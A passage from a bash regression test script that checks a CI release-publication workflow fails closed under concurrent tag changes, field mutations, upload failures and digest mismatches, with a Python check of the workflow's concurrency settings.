    exit 1
  fi
  [ ! -s "$state_same_sha/assets.tsv" ]
  [ "$(cat "$state_same_sha/draft")" = true ]
done
printf 'PASS preexisting or concurrent public tags fail closed including same-SHA annotated tags\n'

for mutation in id draft tag target prerelease name body extra digest; do
  state=$scratch/state-mutation-$mutation
  if run_publish "$state" env PRERELEASE=1 \
      GH_MUTATE_SNAPSHOT=3 GH_MUTATE_KIND="$mutation" >/dev/null 2>&1; then
    printf 'concurrent %s mutation was accepted\n' "$mutation" >&2
    exit 1
  fi
  [ ! -f "$state/patch-fields.log" ]
done
printf 'PASS final single-snapshot gate rejects concurrent identity/title/body/state/asset changes\n'

state_upload_fail=$scratch/state-upload-fail
if run_publish "$state_upload_fail" env PRERELEASE=1 GH_FAIL_UPLOAD=1 >/dev/null 2>&1; then
  printf 'simulated upload failure was accepted\n' >&2
  exit 1
fi
assert_curl_auth_hygiene "$state_upload_fail"
[ "$(cat "$state_upload_fail/draft")" = true ]
[ ! -f "$state_upload_fail/patch-fields.log" ]
before=$(wc -l < "$state_upload_fail/events.log")
if run_publish "$state_upload_fail" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'existing failed draft was taken over on rerun\n' >&2
  exit 1
fi
[ "$before" -eq "$(wc -l < "$state_upload_fail/events.log")" ]

state_digest_fail=$scratch/state-digest-fail
if run_publish "$state_digest_fail" env PRERELEASE=1 GH_CORRUPT_DIGEST=1 >/dev/null 2>&1; then
  printf 'remote digest mismatch was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_digest_fail/draft")" = true ]
[ ! -f "$state_digest_fail/patch-fields.log" ]
printf 'PASS failures leave an unpublished draft that cannot be taken over\n'

python3 - "$WORKFLOW" <<'PY'
import pathlib
import sys

text = pathlib.Path(sys.argv[1]).read_text()
group = "group: release-${{ github.repository }}-${{ inputs.release_tag != '' && inputs.release_tag || github.run_id }}"
assert text.count(group) == 1, "same-tag concurrency group or run-id fallback is missing"
assert text.count("cancel-in-progress: false") == 1
assert "PRERELEASE: ${{ inputs.prerelease && '1' || '0' }}" in text
assert "must set prerelease=true" in text
assert "bash scripts/ci/test-release-publication.sh" in text
PY
printf 'PASS same repository/tag runs serialize without cancelling and empty tags use run id\n'

printf 'RESULT=PASS release-publication-regressions\n'
